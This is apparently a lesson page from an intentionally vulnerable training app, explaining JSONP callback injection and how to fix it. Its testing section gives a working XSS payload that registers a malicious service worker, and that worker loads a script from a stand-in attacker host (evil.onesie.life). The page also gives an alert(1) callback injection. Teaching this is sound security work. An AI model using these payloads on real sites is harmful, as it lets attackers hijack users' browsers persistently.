# Poor JSON with Padding (JSONP) Implementation

### What's the vulnerability?

[JSONP] is commonly used to circumvent things like [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) if you are trying to fetch data asynchronously from a different domain. For this the developer will expose a function in the global namespace that should be called when the data is being received. To then request the data, they inject a new `script` tag into the page to a [JSONP] enabled endpoint with a `callback` parameter that specifies the function name that should be called.

The server then wraps the data that it's returning into the respective function call:

```js
// Example /jsonp?callback=myDataCallback
// server responds with:
myDataCallback({ data: [/*...*/] })
```

If a [JSONP] endpoint is poorly implemented you could use this to generate your own JavaScript though:

```js
// Example /jsonp?callback=alert(1);//
alert(1);//({ data: [/*...*/]})
```

As you can see we are not even interested in the actual data in this case. But we can use this in combination with an existing XSS vulnerability for example to install [dangerous service worker implemenations](https://c0nradsc0rner.wordpress.com/2016/06/17/xss-persistence-using-jsonp-and-serviceworkers/).

### How can the vulnerability be tested?

You can try this by combining it with our [existing XSS vulnerability](cross-site-scripting.md) in the application by visiting the [home page] and posting the following content:

```markdown
[You won't believe this!!!!!!](javascript&#58this;navigator.serviceWorker.register("/post?callback=onfetch=function(e&#41;{if(!(e.request.url.indexOf(':4000'&#41;>0&#41;&#41;{e.respondWith(new	Response('<h1>Hacked</h1><script	src=\\'https://evil.onesie.life/hook.js\\'	type=\\'text/javascript\\'></script>',	{headers:	{'Content-Type':'text/html'}}&#41;&#41; }else{e.fetch(e.request&#41;}}//"&#41;)
```

If you then click the link, it will install a service worker. From that point on any resource the browser is trying to fetch will be overriden with the following HTML:

```html
<h1>Hacked</h1>
<script src="https://evil.onesie.life/hook.js"></script>
```

While in this case we are overriding the whole HTML an attacker could also fetch the original one and only append/inject their own script. 

To uninstall the service worker in Chrome open the developer tools, click on the Applications tab and unregister the service worker you see.

### What causes this vulnerability?

By not properly checking the value of the `callback` query parameter we basically allow to pass in aribitary JavaScript since the attacker could just end their input with `//` to turn the remaining part into a comment.

Since [Service Workers] have to be from the same domain as the page itself, it's the perfect way for an attacker to inject their own service worker.

### How can this be fixed?

You should either only whitelist a set of valid `callback` values or verify that the callback parameter only contains word characters but nothing else. 

### Resources/References
- [XSS persistence using JSONP and serviceWorkers](https://c0nradsc0rner.wordpress.com/2016/06/17/xss-persistence-using-jsonp-and-serviceworkers/)
- [OWASP: From JSONP to XSS Persistence](https://www.owasp.org/images/3/35/2017-04-20-JSONPXSS.pdf)

[JSONP]: https://en.wikipedia.org/wiki/JSONP
[home page]: https://onesie.life/home
[login page]: https://onesie.life/login
[Service Workers]: https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API